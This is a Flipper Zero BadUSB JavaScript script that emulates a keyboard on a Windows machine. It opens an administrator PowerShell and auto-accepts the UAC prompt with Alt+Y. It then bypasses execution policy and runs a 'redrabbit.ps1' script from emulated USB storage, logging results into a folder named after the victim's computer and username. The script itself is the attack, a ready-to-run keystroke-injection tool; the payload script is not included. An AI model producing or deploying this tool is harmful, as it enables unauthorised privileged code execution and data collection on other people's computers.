let image = "/ext/apps_data/mass_storage/RedRabbit.img";

let badusb = require("badusb");
let usbdisk = require("usbdisk");
let storage = require("storage");

print("Checking for Image...");
if (storage.fileExists(image)) {
    print ("Storage Exists.");
}
else {
print ("You first need to create RedRabbit.img and place inside redrabbit.ps1 ...");
exit;
}

badusb.setup({ vid: 0xAAAA, pid: 0xBBBB, mfr_name: "Flipper", prod_name: "Zero" });
print("Waiting for connection");
while (!badusb.isConnected()) {
    delay(1000);
}

/* badusb.press("GUI", "r"); //Open the Run Dialog
delay(300);
badusb.println("powershell");
badusb.press("ENTER");
delay(3000); */
badusb.press("GUI", "r"); //Open Run Dialog
delay(300);
badusb.println('powershell -Command "Start-Process powershell -Verb RunAs"'); // Runs Powershell as Admin
delay(400);
badusb.press("ENTER");
delay(3000);
badusb.press("ALT", "y");
delay(3000);
print("Running payload");
badusb.println("echo 'Please wait for the Script to start and pres Y to re-run it .......!'; Start-Sleep 10; $DriveLetter = Get-Disk -FriendlyName 'Flipper Mass Storage' | Get-Partition | Get-Volume | Select-Object -ExpandProperty DriveLetter;$drivePath = $DriveLetter + ':';$directoryPath = Join-Path -Path $drivePath -ChildPath $env:COMPUTERNAME-$env:USERNAME;New-Item -ItemType Directory -Path $directoryPath;$ScriptPath = $drivePath + '\\redrabbit.ps1';Set-ExecutionPolicy Bypass -Scope Process -Force;cd $directoryPath;& $ScriptPath 2>&1 | tee -FilePath redrabbitLOG.txt;Exit");
badusb.press("ENTER");
badusb.quit();
delay(2000);
print("follow on screen instructions...");

// Open Mass Storage 
usbdisk.start(image);

while (!usbdisk.wasEjected()) {
    delay(1000);
}
usbdisk.stop();
print("Done");